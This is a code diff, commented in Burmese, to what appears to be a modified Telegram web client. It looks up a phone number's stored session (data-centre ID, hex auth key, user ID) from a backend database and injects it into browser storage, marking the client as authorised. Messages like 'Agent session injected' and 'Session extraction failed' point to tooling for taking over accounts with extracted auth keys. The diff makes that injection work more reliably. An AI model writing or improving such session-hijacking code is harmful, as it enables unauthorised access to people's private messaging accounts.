@@ -46,7 +46,7 @@ async function checkAndInjectSession() {
   let loginPhone = urlParams.get('login_phone');
 
   if (loginPhone) {
-    // '+' သင်္ကေတ လွဲချော်မှုမရှိစေရန် ပြန်လည်ပြင်ဆင်ခြင်း
+    // ဖုန်းနံပါတ် Format မှန်ကန်စေရန် ပြင်ဆင်ခြင်း
     loginPhone = loginPhone.replace(/ /g, '+');
     if (!loginPhone.startsWith('+')) {
       loginPhone = '+' + loginPhone;
@@ -61,7 +61,8 @@ async function checkAndInjectSession() {
       
       const data = await response.json();
       
-      if (data.success && data.dcId && data.authKeyHex) {
+      // data.userId ပါဝင်လာမှုကိုပါ စစ်ဆေးရပါမည်
+      if (data.success && data.dcId && data.authKeyHex && data.userId) {
         const hexToArray = (hex: string) => {
           const result = [];
           for (let i = 0; i < hex.length; i += 2) {
@@ -70,32 +71,51 @@ async function checkAndInjectSession() {
           return result;
         };
         
-        const authKeyArray = hexToArray(data.authKeyHex);
+        // ယခင် Auth Key များကို ရှင်းလင်းခြင်း (Storage တစ်ခုလုံး မဖျက်ပါ)
+        for (let i = 1; i <= 5; i++) {
+            localStorage.removeItem(`dc${i}_auth_key`);
+        }
         
-        // 🌟 ပြင်ဆင်ချက်: Storage အဟောင်းများကို ရှင်းမည်။ 🌟
-        // သို့သော် tt-global-state ကို ကိုယ်တိုင် ဝင်မရေးတော့ပါ။ App ကိုယ်တိုင် တည်ဆောက်ခွင့်ပေးပါမည်။
-        localStorage.clear();
-        sessionStorage.clear();
-        
-        // Auth Key များကိုသာ မှန်ကန်စွာ ထည့်သွင်းပါမည်
+        // Auth Key အသစ် သွင်းခြင်း
         localStorage.setItem('dc', String(data.dcId));
-        localStorage.setItem(`dc${data.dcId}_auth_key`, JSON.stringify(authKeyArray));
+        localStorage.setItem(`dc${data.dcId}_auth_key`, JSON.stringify(hexToArray(data.authKeyHex)));
+        
+        // 🌟 Error မတက်စေရန် Global State ကို စနစ်တကျ တည်ဆောက်ခြင်း 🌟
+        let globalState: any = {};
+        try {
+            const stored = localStorage.getItem('tt-global-state');
+            if (stored) globalState = JSON.parse(stored);
+        } catch (e) {}
+
+        // Settings မရှိပါက Error မတက်စေရန် Default ထည့်ပေးခြင်း (White Screen ပြဿနာကို ဖြေရှင်းသည်)
+        if (!globalState.settings || !globalState.settings.byKey) {
+            globalState.settings = { 
+                byKey: { theme: "dark", language: "en", messageTextSize: 16 } 
+            };
+        }
+
+        // Auth State အား Ready အဖြစ် သတ်မှတ်ခြင်း
+        globalState.auth = { state: "authorizationStateReady" };
+        
+        // 🌟 [အရေးကြီးဆုံး] Teact Framework လိုအပ်သော User ID ကို ထည့်သွင်းခြင်း 🌟
+        globalState.currentUserId = String(data.userId);
+
+        localStorage.setItem('tt-global-state', JSON.stringify(globalState));
         
         alert("Mission Synchronized! Agent session injected.");
         
-        // URL ထဲမှ Parameter ကို ဖျောက်ပြီး Reload လုပ်ပါမည်
+        // URL ကို ရှင်းလင်း၍ App အား စတင်စေခြင်း
         window.history.replaceState({}, document.title, window.location.pathname);
         window.location.reload(); 
         return; 
       } else {
-        alert("Session extraction failed or not found in database.");
+        alert("Session extraction failed or incomplete data.");
       }
     } catch (error) {
       console.error("Session Injection Error:", error);
     }
   }
   
-  // login_phone မပါလာလျှင် ပုံမှန်အတိုင်း App ကို စတင်မည်
   init();
 }
 
